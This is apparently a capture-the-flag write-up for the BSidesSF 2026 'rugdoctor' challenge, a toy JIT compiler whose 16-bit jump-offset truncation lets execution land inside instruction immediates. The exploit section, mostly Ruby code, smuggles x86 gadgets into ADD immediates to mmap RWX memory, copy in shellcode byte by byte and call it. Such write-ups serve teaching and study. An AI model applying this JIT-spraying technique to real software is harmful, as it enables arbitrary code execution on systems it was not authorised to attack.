---
title: 'BSidesSF 2026: rugdoctor - a broken JIT compiler pwn challenge'
author: ron
layout: post
categories:
- bsidessf-2026
- bsidessf
- ctfs
- pwn
- JIT
permalink: "/2026/bsidessf-2026-rugdoctor-a-broken-jit-compiler-pwn-challenge"
date: '2026-03-30T13:55:49-07:00'

---

This is a write-up for `rugdoctor`, which is a JIT compiler with a 16-bit
integer overflow. The integer overflow allows you to jump to the middle of
other instructions, to run small bits of code in between other instructions.

As always, you can find copies of the binaries, containers, and full solution
in our [GitHub repo](https://github.com/BSidesSF/ctf-2026-release)!

<!--more-->

## The language

I made a simple BASIC-like language that looks sorta like this:

```
let $a 10

loop $a
  let $b 10
  subv $b $a
  add $b 1
  print $b
endloop

exit 0
```

or:

```
let $b 3

loop $b
  let $a 72
  printchar $a
  let $a 101
  printchar $a
  let $a 108
  printchar $a
  let $a 108
  printchar $a
  let $a 111
  printchar $a
  let $a 32
  printchar $a
  let $a 87
  printchar $a
  let $a 111
  printchar $a
  let $a 114
  printchar $a
  let $a 108
  printchar $a
  let $a 100
  printchar $a
  let $a 10
  printchar $a
endloop

exit 0
```

Your code has access to four variables: `$A`, `$B`, `$C`, and `$D`.

And the instructions are:

* `LET $VAR <int32>` - assign an immediate value to a variable
* `LETV $VAR1 $VAR2` - copy a variable to another variable
* `ADD $VAR <int32>` - add an immediate value to a variable
* `ADDV $VAR1 $VAR2` - add two variables together (result is stored in `$VAR1`)
* `SUB $VAR <int32>` - subtract an immediate value from a variable
* `SUBV $VAR1 $VAR2` - subtract `$VAR2` from `$VAR1` (result is stored in `$VAR1`)
* `MUL $VAR <int32>` - multiply a variable by an immediate value
* `PRINT $VAR` - print the variable (as a number)
* `PRINTCHAR $VAR` - print the variable (as a character)
* `LOOP $VAR ... ENDLOOP` - loop `$VAR` times, deducting 1 from `$VAR` each iteration (always executes once)
* `IF $VAR ... ENDIF` - only run the given block if `$VAR` is non-zero
* `EXIT <int32>` - exit with an immediate value as the exit code

## The vulnerability

The instructions are converted to amd64 code using a big `switch` statement:

```c
switch(command.keyword) {
  case COMMAND_COMMENT:
    break;

  case COMMAND_LET:
    // mov <reg>, <immediate>
    add_u8(&state, 0x41);
    add_u8(&state, 0xbc | reg_mask(&state, command.args.args_let.variable));
    add_u32(&state, command.args.args_let.immediate);
    break;

  case COMMAND_LETV:
    // mov <reg>, <immediate>
    add_u8(&state, 0x4d);
    add_u8(&state, 0x89);
    add_u8(&state, 0xe4 |
      (reg_mask(&state, command.args.args_letv.variable2) << 3)
      | (reg_mask(&state, command.args.args_letv.variable1))
    );
    break;

  case COMMAND_ADD:
    add_u8(&state, 0x49);
    add_u8(&state, 0x81);
    add_u8(&state, 0xc4 | (reg_mask(&state, command.args.args_add.variable)));
    add_u32(&state, command.args.args_add.immediate);
    break;

  case COMMAND_ADDV:
    add_u8(&state, 0x4d);
    add_u8(&state, 0x01);
    add_u8(&state, 0xe4 |
      (reg_mask(&state, command.args.args_addv.variable2) << 3)
      | (reg_mask(&state, command.args.args_addv.variable1))
    );
    break;

  // .........
```

The issue is in the `if` and `loop` operations:

```c
  case COMMAND_ENDIF:
    if(state.in_if == 0) {
      error(&state, "ENDIF without IF!");
    }
  
    state.in_if -= 1;
  
    // Update the start of the if
    int32_t if_jump = ((uint16_t)state.code_offset - (uint16_t)state.if_address[state.in_if] - 4);
    memcpy(state.code_buffer + state.if_address[state.in_if], &if_jump, 4);
  
    break;
```

By casting the jump to `uint16_t`, any jump longer than 65,536 bytes will wrap
around and jump to the wrong place.

*The trick is, that place might be in the middle of another instruction*

Also, importantly, those instructions are executable because it's JIT code.

## My exploit

I used a series of `ADD` instructions, since they permit a free-form 32-bit
immediate:

```c
  case COMMAND_ADD:
    add_u8(&state, 0x49);
    add_u8(&state, 0x81);
    add_u8(&state, 0xc4 | (reg_mask(&state, command.args.args_add.variable)));
    add_u32(&state, command.args.args_add.immediate);
    break;
```

I set up the broken jump such that it jumps into the `immediate` of the first
`ADD` instruction. Then I use a series of 2-byte instructions followed by a very
short jump (`eb03` which means "jump 3 bytes ahead") to reach the next
instruction:

```ruby
adds.concat([
  # Padding
  "\xcc\xcc", # This is jusssst skipped but required

  # Set rdi to 0 (to allocate memory anywhere)
  "\x6a\x00", # push 0
  "\x5f\x90", # pop rdi / nop

  # Set rsi to 1 (length - min size is a page, so it'll get rounded way up)
  "\x6a\x01", # push 1
  "\x5e\x90", # pop rsi

  # Set rdx to 7 (prot = read | write | exec)
  "\x6a\x07", # push 7
  "\x5a\x90", # pop rdx

  # Set r10 to 0x22 (flags = MAP_PRIVATE | MAP_ANONYMOUS)
  "\x6a\x22", # push 0x22
  "\x41\x5a", # pop r10

  # Set r8 to -1 (fd)
  "\x6a\xff", # push -1
  "\x41\x58", # pop r8

  # Set r9 to 0 (offset)
  "\x6a\x00", # push 0
  "\x41\x59", # pop r9

  # Set rax to 9 (the sys_mmap number)
  "\x6a\x09", # push 9
  "\x58\x90", # pop rax

  # syscall
  "\x0f\x05",

  # This map adds a `jmp $+3` after each instruction, which jumps to the next
].map { |c| "#{ c }\xeb\x03".unpack('V').pop })
```

That uses a syscall to allocate some memory and return it in `rax`.

Populating the memory with shellcode was a bit trickier.

We back up `rax` in a different register:

```ruby
# This code preserves that buffer by storing it in rbx
adds << "\x50\x5b\xeb\x03".unpack('V').pop # push rax / pop rbx
```

Then for each byte of shellcode, we use a sorta complex write to write it to
memory. The problem is that I couldn't find a way to do that in 2 bytes, so
I had to use 3 bytes. That means that I couldn't use `eb03` for the jumps, I had
to use much longer jumps (specifically, 49 bytes).

```ruby
SHELLCODE.chars.each do |c|
  # This instruction is 3 characters! That means we don't cleanly control the
  # jmp and are stuck jmp'ing the distance of the next instruction (which,
  # thankfully, hits code we control!)
  # mov byte ptr [rax], c / jmp $+49
  adds << "\xc6\x00#{ c }\xeb".unpack('V').pop

  # This code is jumped over
  adds.concat([1] * 10)

  # The jmp $+49 hits the second byte of this, so we do a NOP and then our
  # standard jump $+3
  adds << "\x00\x90\xeb\x03".unpack('V').pop # <-- this runs, starting at the second byte

  # This increments al - incrementing rax is too long, and incrementing eax
  # breaks the pointer
  #
  # We know that mmap() will always return page-aligned memory, so it's safe to
  # do this up to 255 times
  adds << "\xfe\xc0\xeb\x03".unpack('V').pop
end
```

The 49-byte jump runs into the second byte of the 11th jump instruction.
Fortunately, we can use `\x90` (`nop`), then `\xeb\x03` to get back to the start
of a jump instruction. Then we increment `al` and do it again.

That creates a massive amount of code, but it works!

Finally, at the end, we `call rbx` (which is where we stored the `rax` starting
pointer):

```ruby
# Finally, call rbx to give execution to our code
adds << "\xff\xd3\xeb\x03".unpack('V').pop
```

Then add enough extra `ADD` instructions to hit the overflow we want:

```ruby
# This adds enough junk to the end to cause the overflow
adds.concat([1] * (NEEDED_ADDS - adds.length))
```

Then build the BASIC-like code:

```ruby
# Build the code
code = <<~CODE
  let $b 0

  # This 'if' jumps too far, and ends up in the middle of an instruction
  if $b
  #{ adds.map { |add| "    add $c #{ add }\n" }.join }
  endif

  exit 0
CODE
```

The resulting code sorta looks like:

```
let $b 0

# This 'if' jumps too far, and ends up in the middle of an instruction
if $b
    add $c 1
    add $c 1
    add $c 1
    add $c 1
    add $c 1
    add $c 1
    add $c 1
    add $c 65785036
    add $c 65732714
    add $c 65769567
    add $c 65732970
    add $c 65769566
    add $c 65734506
# .............
    add $c 1
    add $c 1
    add $c 1
    add $c 1
    add $c 1
    add $c 1
    add $c 65769472
    add $c 65782014
    add $c 3947364550
    add $c 1
    add $c 1
    add $c 1
# ............
    add $c 1
    add $c 1
    add $c 1
    add $c 1

endif

exit 0
```

Which successfully runs any arbitrary shellcode!
